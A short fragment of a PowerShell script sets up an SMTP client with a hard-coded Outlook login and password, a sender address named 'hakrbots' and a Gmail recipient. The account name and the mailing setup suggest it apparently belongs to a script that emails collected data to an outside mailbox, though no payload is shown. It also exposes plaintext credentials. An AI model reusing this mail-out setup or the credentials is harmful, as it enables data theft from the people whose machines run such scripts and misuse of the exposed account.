...
$smtp.Credentials = New-Object System.Net.NetworkCredential("hakrbots@outlook.com", "drizzly-unmoved");
$smtp.EnableSsl = $true
$Message.From = "hakrbots@outlook.com"
$Message.To.Add("antauthority@gmail.com")
